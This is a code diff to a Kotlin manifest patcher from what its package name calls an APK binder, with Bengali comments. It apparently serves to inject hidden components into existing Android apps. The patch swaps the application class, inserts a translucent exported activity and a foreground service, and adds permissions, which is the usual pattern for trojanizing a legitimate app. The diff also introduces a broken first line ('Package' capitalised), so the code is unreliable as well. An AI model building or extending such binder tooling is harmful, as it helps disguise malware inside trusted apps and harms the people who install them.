@@ -1,4 +1,4 @@
-package Com.devhs.apkbinder.binder
+Package com.devhs.apkbinder.binder
 
 import java.io.ByteArrayOutputStream
 
@@ -17,6 +17,7 @@ object AxmlPatcher {
     const val ATTR_NAME = 0x01010003
     const val ATTR_THEME = 0x01010000
     const val ATTR_FG_TYPE = 0x01010599
+    const val ATTR_EXPORTED = 0x0101001d // নতুন: সার্ভিস ও অ্যাক্টিভিটির এক্সপোর্টেড ফিক্স করার জন্য
     const val STYLE_TRANSLUCENT = 0x0103000b
 
     sealed class Value {
@@ -356,6 +357,7 @@ object AxmlPatcher {
         added.add("name")
         added.add("theme")
         added.add("foregroundServiceType")
+        added.add("exported") // নতুন স্ট্রিং স্লটের জন্য যোগ করা হলো
         added.add(ANDROID_NS)
         added.add("activity")
         added.add("service")
@@ -372,6 +374,7 @@ object AxmlPatcher {
         attrIds[slot(0)] = ATTR_NAME
         attrIds[slot(1)] = ATTR_THEME
         attrIds[slot(2)] = ATTR_FG_TYPE
+        attrIds[slot(3)] = ATTR_EXPORTED // রিসোর্স ম্যাপে আইডি ম্যাপ করার জন্য
 
         val withStrings = appendStrings(xml, added, attrIds)
         val pool = readPool(withStrings, 8)
@@ -388,11 +391,11 @@ object AxmlPatcher {
         for (i in 0 until application.attrCount) {
             val a = i * 20
             if (matches(withStrings, pool, i32(attrs, a + 4), "name")) {
-                putI32(attrs, a + 8, slot(7))
+                putI32(attrs, a + 8, slot(8))
                 putU16(attrs, a + 12, 8)
                 attrs[a + 14] = 0
                 attrs[a + 15] = TYPE_STRING.toByte()
-                putI32(attrs, a + 16, slot(7))
+                putI32(attrs, a + 16, slot(8))
                 replaced = true
                 break
             }
@@ -400,23 +403,25 @@ object AxmlPatcher {
         application.attrBytes = ByteArrayOutputStream().apply { write(attrs) }
         if (!replaced) {
             val one = ByteArrayOutputStream()
-            one.writeAttr(slot(3), slot(0), slot(7), TYPE_STRING, slot(7))
+            one.writeAttr(slot(4), slot(0), slot(8), TYPE_STRING, slot(8))
             appendAttr(application, one.toByteArray())
         }
 
-        // activity + service যোগ (application-এর শুরুতে)
+        // activity + service যোগ (application-এর শুরুতে) - এখানে সার্ভিসে exported ও fgType ঠিক করা হয়েছে
         val gate = makeElement(
-            slot(4),
-            listOf(
-                Attr(slot(0), Value.Str(slot(8))),
-                Attr(slot(1), Value.Ref(STYLE_TRANSLUCENT))
-            )
-        )
-        val service = makeElement(
             slot(5),
             listOf(
                 Attr(slot(0), Value.Str(slot(9))),
-                Attr(slot(2), Value.Dec(1))
+                Attr(slot(1), Value.Ref(STYLE_TRANSLUCENT)),
+                Attr(slot(3), Value.Dec(1)) // Activity exported=true
+            )
+        )
+        val service = makeElement(
+            slot(6),
+            listOf(
+                Attr(slot(0), Value.Str(slot(10))),
+                Attr(slot(2), Value.Dec(1)),
+                Attr(slot(3), Value.Dec(0)) // Service exported=false (সিকিউরিটি ঠিক রাখার জন্য)
             )
         )
         application.children.add(0, service)
@@ -425,7 +430,7 @@ object AxmlPatcher {
         // পারমিশন যোগ (manifest-এ, application-এর আগে)
         val index = manifest.children.indexOf(application)
         for (i in 0 until permissions.size) {
-            val perm = makeElement(slot(6), listOf(Attr(slot(0), Value.Str(slot(10) + i))))
+            val perm = makeElement(slot(7), listOf(Attr(slot(0), Value.Str(slot(11) + i))))
             manifest.children.add(index, perm)
         }
 
